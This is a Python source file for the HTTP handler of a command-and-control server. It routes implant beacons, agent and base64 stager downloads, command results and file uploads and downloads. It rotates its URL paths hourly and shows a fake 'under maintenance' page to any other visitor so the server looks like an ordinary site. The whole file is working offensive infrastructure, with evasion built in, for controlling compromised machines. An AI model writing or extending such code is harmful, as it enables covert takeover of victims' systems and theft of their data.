import http.server
import logging
import json
import base64

logger = logging.getLogger(__name__)

class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
    """
    Custom HTTP request handler for C2 communications
    Routes requests to appropriate handlers using modular architecture
    """
    
    def __init__(self, request, client_address, server):
        # Store server attributes before calling parent's init
        self.server = server
        self.campaign_name = getattr(server, 'campaign_name', 'default')
        self.client_manager = getattr(server, 'client_manager', None)
        self.logger_func = getattr(server, 'logger_func', logging.info)
        self.crypto_manager = getattr(server, 'crypto_manager', None)
        self.external_logger = self.logger_func
        
        # Default paths in case we need them as fallback
        self.default_paths = {
            "beacon_path": "/beacon",
            "agent_path": "/raw_agent",
            "stager_path": "/b64_stager",
            "cmd_result_path": "/command_result",
            "file_upload_path": "/file_upload",
            "file_request_path": "/file_request"
        }
        
        # Save client_address for later use
        self._client_address = client_address
        
        # Call parent init - this will call setup() and handle()
        super().__init__(request, client_address, server)
    
    def log_message(self, format_str, *args):
        """Override to use external logger - fixed to handle f-strings properly"""
        # Instead of using % formatting, we'll just pass the formatted string directly
        if args:
            # If traditional args are provided, use standard formatting
            message = format_str % args
        else:
            # Otherwise, assume format_str is already formatted (e.g., from an f-string)
            message = format_str
            
        self.external_logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {message}")

    def do_GET(self):
        """Route GET requests to the unified operation router"""
        # Initialize components just before handling the request
        self._initialize_components()
        
        # Check if rotation is needed
        if self.path_router.check_rotation():
            self.external_logger(f"Paths rotated during request handling")

        # Log the request
        self.log_message(f"Received GET request for {self.path}")

        # Extract base path without query string for routing
        base_path = self.path.split('?')[0] if '?' in self.path else self.path
        
        # First check if the path is valid (part of our path pool)
        endpoint_type = self.path_router.get_endpoint_type(base_path)
        
        if endpoint_type:
            # Valid path in our pool, route to operation router
            self.operation_router.handle_operation(method="GET")
        else:
            # Not a valid path, handle as default
            self._handle_default()
    
    def do_POST(self):
        """Route POST requests to the unified operation router"""
        # Initialize components just before handling the request
        self._initialize_components()
        
        # Check if rotation is needed
        if self.path_router.check_rotation():
            self.external_logger(f"Paths rotated during request handling")
        
        # Log the request
        self.log_message(f"Received POST request for {self.path}")
        
        # Check if this path is in our valid path pool
        endpoint_type = self.path_router.get_endpoint_type(self.path)
        
        if endpoint_type:
            # Valid path in our pool, route to operation router
            self.operation_router.handle_operation(method="POST")
        else:
            # Not a valid path, handle as default
            self._handle_default()
    
    def _initialize_components(self):
        """Initialize components when actually handling a request"""
        # Only initialize once
        if hasattr(self, 'path_router'):
            return
            
        # Initialize path rotation manager
        self._initialize_path_rotation(self.server)
        
        # Initialize crypto helper
        if self.crypto_manager is not None:
            from core.crypto_operations import CryptoHelper
            self.crypto_helper = CryptoHelper(self.crypto_manager, self.client_manager)
        else:
            self.crypto_helper = None
            
        # Initialize client helper if we have client manager and crypto helper
        if self.client_manager is not None and self.crypto_helper is not None:
            from core.client_operations import ClientHelper
            self.client_helper = ClientHelper(self.client_manager, self.crypto_helper, self.server)
        else:
            self.client_helper = None
            
        # Create a new operation router for dynamic path handling
        from core.operation_router import OperationRouter
        self.operation_router = OperationRouter(
            self,
            self.client_manager,
            self.crypto_helper, 
            self.client_helper,
            self.path_router
        )

    def _initialize_path_rotation(self, server):
        """Initialize path rotation manager"""
        # Update paths with custom paths from server if provided
        initial_paths = self.default_paths.copy()
        if hasattr(server, 'url_paths') and server.url_paths:
            initial_paths.update(server.url_paths)
            
        # Make sure all paths start with '/'
        for key, path in initial_paths.items():
            if not path.startswith('/'):
                initial_paths[key] = '/' + path
                
        # Use existing path manager if available
        if hasattr(server, 'path_manager'):
            path_manager = server.path_manager
        else:
            # Create path rotation manager if not already on server
            from utils.path_rotation import PathRotationManager
            campaign_folder = f"{self.campaign_name}_campaign"
            rotation_interval = getattr(server, 'path_rotation_interval', 3600)  # Default 1 hour
            path_manager = PathRotationManager(
                campaign_folder, 
                self.external_logger, 
                initial_paths=initial_paths,
                rotation_interval=rotation_interval
            )
            # Load existing state if available
            path_manager.load_state()
            # Attach to server for other handlers to use
            server.path_manager = path_manager
            
        # Create path router using the path manager
        from core.path_routing import PathRouter
        self.path_router = PathRouter(path_manager)
    
    def _handle_default(self):
        """Handle default/unmatched paths with a generic response"""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # Return a generic-looking webpage
        message = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Website</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
                .container { max-width: 800px; margin: 0 auto; }
                h1, p { color: #333; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Welcome</h1>
                <p>This page is currently under maintenance. Please check back later.</p>
            </div>
        </body>
        </html>
        """
        self.wfile.write(message.encode("utf-8"))